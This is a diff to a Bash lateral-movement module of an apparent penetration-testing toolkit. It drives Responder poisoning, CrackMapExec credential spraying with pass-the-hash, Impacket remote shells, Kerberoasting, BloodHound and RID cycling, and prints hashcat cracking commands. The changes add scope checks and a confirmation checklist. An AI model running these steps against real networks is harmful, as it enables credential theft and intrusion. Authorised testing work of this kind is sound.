@@ -7,31 +7,31 @@
 #
 # Tools and techniques:
 #
-#   Responder  — Poisons LLMNR/NBT-NS/mDNS broadcast queries to capture
+#   Responder  - Poisons LLMNR/NBT-NS/mDNS broadcast queries to capture
 #                NTLMv2 challenge-response hashes passively.
 #                Works when any Windows host tries to resolve a non-existent
 #                hostname (very common on Windows networks).
 #
-#   CrackMapExec — Validates credentials against all SMB hosts simultaneously.
+#   CrackMapExec - Validates credentials against all SMB hosts simultaneously.
 #                  Identifies which hosts your creds work on, lists logged-on
 #                  users, executes commands.
 #
 #   Impacket suite:
-#     psexec.py   — SMB-based remote execution using ADMIN$ and SVCCTL
-#     wmiexec.py  — WMI-based remote execution (less detectable)
-#     smbexec.py  — Service-based SMB exec (avoids writing to disk)
-#     atexec.py   — Remote execution via Task Scheduler
-#     secretsdump — Dump SAM, LSA secrets, NTDS.dit remotely
-#     lookupsid   — RID cycling to enumerate domain users without auth
-#     GetUserSPNs — Kerberoasting: request service tickets for offline cracking
+#     psexec.py   - SMB-based remote execution using ADMIN$ and SVCCTL
+#     wmiexec.py  - WMI-based remote execution (less detectable)
+#     smbexec.py  - Service-based SMB exec (avoids writing to disk)
+#     atexec.py   - Remote execution via Task Scheduler
+#     secretsdump - Dump SAM, LSA secrets, NTDS.dit remotely
+#     lookupsid   - RID cycling to enumerate domain users without auth
+#     GetUserSPNs - Kerberoasting: request service tickets for offline cracking
 #
-#   BloodHound + SharpHound — Map AD permissions graph to find privilege paths
+#   BloodHound + SharpHound - Map AD permissions graph to find privilege paths
 #
 #   Techniques:
-#     Pass-the-Hash  — Use NTLM hash directly without cracking
-#     Pass-the-Ticket — Use Kerberos ticket (TGT/TGS) for auth
-#     Kerberoasting  — Request service tickets and crack offline
-#     AS-REP Roasting — Users without pre-auth; get hash without creds
+#     Pass-the-Hash  - Use NTLM hash directly without cracking
+#     Pass-the-Ticket - Use Kerberos ticket (TGT/TGS) for auth
+#     Kerberoasting  - Request service tickets and crack offline
+#     AS-REP Roasting - Users without pre-auth; get hash without creds
 
 run_module_main() {
     local outdir="${SESSION_DIR}/lateral"
@@ -40,12 +40,14 @@ run_module_main() {
 
     echo ""
     echo -e "${BOLD}Lateral Movement Modules:${NC}"
-    echo -e "  ${CYAN}1)${NC} Responder — LLMNR/NBT-NS poisoning (passive capture)"
-    echo -e "  ${CYAN}2)${NC} CrackMapExec — Credential spraying across SMB"
-    echo -e "  ${CYAN}3)${NC} Impacket — Remote execution (psexec/wmiexec)"
-    echo -e "  ${CYAN}4)${NC} Kerberoasting — Request and crack service tickets"
-    echo -e "  ${CYAN}5)${NC} BloodHound collection — AD attack path mapping"
-    echo -e "  ${CYAN}6)${NC} RID Cycling — User enumeration without credentials"
+    local _resp_tag="${DIM}[internal only]${NC}"
+    [[ "${ENGAGEMENT_TYPE}" == "external" ]] && _resp_tag="${RED}[blocked - external engagement]${NC}"
+    echo -e "  ${CYAN}1)${NC} Responder - LLMNR/NBT-NS poisoning (passive capture)  ${_resp_tag}"
+    echo -e "  ${CYAN}2)${NC} CrackMapExec - Credential spraying across SMB"
+    echo -e "  ${CYAN}3)${NC} Impacket - Remote execution (psexec/wmiexec)"
+    echo -e "  ${CYAN}4)${NC} Kerberoasting - Request and crack service tickets"
+    echo -e "  ${CYAN}5)${NC} BloodHound collection - AD attack path mapping"
+    echo -e "  ${CYAN}6)${NC} RID Cycling - User enumeration without credentials"
     echo -e "  ${CYAN}7)${NC} All of the above"
     echo -n "Choice [1-7]: "
     local choice; read -r choice
@@ -76,17 +78,50 @@ lateral_responder() {
     local outdir="${SESSION_DIR}/lateral"
 
     divider
-    echo -e "${BOLD}Responder — LLMNR/NBT-NS Poisoning${NC}"
+    echo -e "${BOLD}Responder - LLMNR/NBT-NS Poisoning${NC}"
     echo ""
     explain "LLMNR and NBT-NS are Windows broadcast protocols for name resolution."
     explain "When a Windows host can't find a hostname via DNS, it broadcasts a query."
     explain "Responder intercepts these queries and sends forged responses,"
-    explain "causing the victim to authenticate to us — capturing NTLMv2 hashes."
+    explain "causing the victim to authenticate to us - capturing NTLMv2 hashes."
     explain ""
     explain "Then crack offline: hashcat -m 5600 hashes.txt rockyou.txt"
     explain "Or relay (without cracking) using ntlmrelayx.py"
     echo ""
-    warn "Responder modifies network broadcast responses — coordinate with client"
+
+    # External engagement - Responder is not applicable
+    if [[ "${ENGAGEMENT_TYPE}" == "external" ]]; then
+        echo -e "${RED}${BOLD}  ⚠  NOT APPLICABLE - EXTERNAL ENGAGEMENT${NC}"
+        echo ""
+        echo -e "${YELLOW}  Responder poisons broadcast traffic on the LOCAL network segment your"
+        echo -e "  machine is connected to - not the target's. Against an external target"
+        echo -e "  this would only affect your own office or home LAN, not the client."
+        echo ""
+        echo -e "  This module requires physical or VPN presence on the target's internal"
+        echo -e "  network. Re-run showdown with -i if this is an internal engagement.${NC}"
+        echo ""
+        return
+    fi
+
+    # Internal engagement - mandatory pre-flight checklist
+    echo -e "${RED}${BOLD}  ⚠  NETWORK IMPACT WARNING${NC}"
+    echo ""
+    echo -e "${YELLOW}  Responder will poison LLMNR/NBT-NS queries on the entire local segment."
+    echo -e "  Every Windows host on the same LAN as this machine may authenticate to"
+    echo -e "  you - including hosts outside the agreed target scope."
+    echo ""
+    echo -e "  Confirm before proceeding:${NC}"
+    echo -e "  ${CYAN}[1]${NC} This machine is on the CLIENT's network, not your own office/home LAN"
+    echo -e "  ${CYAN}[2]${NC} The client's scope covers broadcast poisoning on this segment"
+    echo -e "  ${CYAN}[3]${NC} You know how to remediate if needed - see ${BOLD}sop/REMEDIATION.md${NC}"
+    echo ""
+    if ! confirm "  All confirmed - proceed with Responder?"; then
+        info "Responder skipped."
+        return
+    fi
+    echo ""
+
+    warn "Responder modifies network broadcast responses - coordinate with client"
     warn "Run duration: recommend 10-30 minutes during working hours for best results"
     echo ""
 
@@ -150,7 +185,7 @@ lateral_responder() {
             success "Captured ${hash_count} NTLMv2 hash(es)"
             append_finding "CRITICAL" \
                 "LLMNR poisoning: ${hash_count} NTLMv2 hash(es) captured" \
-                "Hashes at ${hash_out} — crack with: hashcat -m 5600 ${hash_out} <wordlist>"
+                "Hashes at ${hash_out} - crack with: hashcat -m 5600 ${hash_out} <wordlist>"
             cat "${hash_out}"
 
             # Offer to run hashcat
@@ -183,7 +218,7 @@ lateral_cme() {
     local outdir="${SESSION_DIR}/lateral"
 
     divider
-    echo -e "${BOLD}CrackMapExec — Credential Spraying & Lateral Spread${NC}"
+    echo -e "${BOLD}CrackMapExec - Credential Spraying & Lateral Spread${NC}"
     echo ""
     explain "Tests a credential set against all SMB hosts in scope"
     explain "Pwn3d! = your account has local admin rights on that host"
@@ -212,7 +247,7 @@ lateral_cme() {
     # Detect hash vs password
     local auth_flags=()
     if [[ "${pass_or_hash}" =~ ^[0-9a-fA-F]{32}(:[0-9a-fA-F]{32})?$ ]]; then
-        info "Detected NTLM hash — using Pass-the-Hash"
+        info "Detected NTLM hash - using Pass-the-Hash"
         auth_flags=(-u "${user}" -H "${pass_or_hash}")
     else
         auth_flags=(-u "${user}" -p "${pass_or_hash}")
@@ -261,12 +296,12 @@ lateral_impacket() {
     local outdir="${SESSION_DIR}/lateral"
 
     divider
-    echo -e "${BOLD}Impacket — Remote Execution${NC}"
+    echo -e "${BOLD}Impacket - Remote Execution${NC}"
     echo ""
-    explain "psexec.py  — Creates a service via ADMIN$/SVCCTL. Loud — creates event logs"
-    explain "wmiexec.py — Uses WMI for execution. Quieter, no service creation"
-    explain "smbexec.py — Uses Service Control Manager, outputs via SMB share"
-    explain "atexec.py  — Task Scheduler execution. Good for scheduled commands"
+    explain "psexec.py  - Creates a service via ADMIN$/SVCCTL. Loud - creates event logs"
+    explain "wmiexec.py - Uses WMI for execution. Quieter, no service creation"
+    explain "smbexec.py - Uses Service Control Manager, outputs via SMB share"
+    explain "atexec.py  - Task Scheduler execution. Good for scheduled commands"
     echo ""
 
     local cred_line; cred_line=$(get_credentials)
@@ -281,8 +316,8 @@ lateral_impacket() {
 
     echo ""
     echo -e "${BOLD}Execution method:${NC}"
-    echo -e "  ${CYAN}1)${NC} wmiexec.py   ${DIM}[recommended — semi-interactive shell]${NC}"
-    echo -e "  ${CYAN}2)${NC} psexec.py    ${DIM}[creates service — very loud]${NC}"
+    echo -e "  ${CYAN}1)${NC} wmiexec.py   ${DIM}[recommended - semi-interactive shell]${NC}"
+    echo -e "  ${CYAN}2)${NC} psexec.py    ${DIM}[creates service - very loud]${NC}"
     echo -e "  ${CYAN}3)${NC} smbexec.py   ${DIM}[no disk write, uses service]${NC}"
     echo -e "  ${CYAN}4)${NC} atexec.py    ${DIM}[task scheduler, single command]${NC}"
     echo -n "Choice [1-4]: "
@@ -312,12 +347,12 @@ lateral_impacket() {
             if check_tool wmiexec.py; then
                 script -q -c "wmiexec.py ${auth_str}" "${out}" 2>/dev/null || true
             else
-                warn "wmiexec.py not found — try: apt install python3-impacket"
+                warn "wmiexec.py not found - try: apt install python3-impacket"
             fi
             ;;
         2)
             info "psexec → interactive SYSTEM shell on ${target_host}"
-            warn "This creates a service in the Windows Event Log — very detectable"
+            warn "This creates a service in the Windows Event Log - very detectable"
             if check_tool psexec.py; then
                 script -q -c "psexec.py ${auth_str}" "${out}" 2>/dev/null || true
             fi
@@ -348,11 +383,11 @@ lateral_kerberoast() {
     local outdir="${SESSION_DIR}/lateral"
 
     divider
-    echo -e "${BOLD}Kerberoasting — Offline Service Ticket Cracking${NC}"
+    echo -e "${BOLD}Kerberoasting - Offline Service Ticket Cracking${NC}"
     echo ""
     explain "Any authenticated domain user can request a service ticket (TGS) for any SPN."
     explain "The TGS is encrypted with the service account's NTLM hash."
-    explain "We export the ticket and crack it offline — no lockout possible."
+    explain "We export the ticket and crack it offline - no lockout possible."
     explain "High-value service accounts (SQL, Exchange, backups) often have weak passwords."
     echo ""
     explain "GetUserSPNs.py requests tickets for all SPNs in the domain."
@@ -395,7 +430,7 @@ lateral_kerberoast() {
         success "Got ${ticket_count} Kerberos ticket(s) for offline cracking"
         append_finding "HIGH" \
             "Kerberoastable SPNs found: ${ticket_count} tickets" \
-            "Hashes at ${out} — crack with: hashcat -m 13100 ${out} <wordlist>"
+            "Hashes at ${out} - crack with: hashcat -m 13100 ${out} <wordlist>"
 
         if confirm "Attempt offline crack with hashcat now?"; then
             local wl; wl=$(wl_passwords)
@@ -423,7 +458,7 @@ lateral_kerberoast() {
 
             if grep -q "krb5asrep" "${asrep_out}" 2>/dev/null; then
                 append_finding "HIGH" "AS-REP Roastable accounts found" \
-                    "Hashes at ${asrep_out} — crack with: hashcat -m 18200"
+                    "Hashes at ${asrep_out} - crack with: hashcat -m 18200"
             fi
         fi
     fi
@@ -435,7 +470,7 @@ lateral_bloodhound() {
     mkdir -p "${outdir}"
 
     divider
-    echo -e "${BOLD}BloodHound — Active Directory Attack Path Mapping${NC}"
+    echo -e "${BOLD}BloodHound - Active Directory Attack Path Mapping${NC}"
     echo ""
     explain "BloodHound visualises AD as a graph: users, groups, computers, ACLs."
     explain "It finds the shortest privilege escalation path to Domain Admin."
@@ -485,11 +520,11 @@ lateral_rid_cycle() {
     local outdir="${SESSION_DIR}/lateral"
 
     divider
-    echo -e "${BOLD}RID Cycling — User Enumeration via SMB (lookupsid)${NC}"
+    echo -e "${BOLD}RID Cycling - User Enumeration via SMB (lookupsid)${NC}"
     echo ""
     explain "Windows assigns each user/group a Relative ID (RID)."
     explain "lookupsid.py queries each RID (500-5000) to enumerate all users/groups."
-    explain "Works with null session or any domain user — harvests full user list."
+    explain "Works with null session or any domain user - harvests full user list."
     echo ""
 
     if ! check_tool lookupsid.py && ! check_tool impacket-lookupsid; then
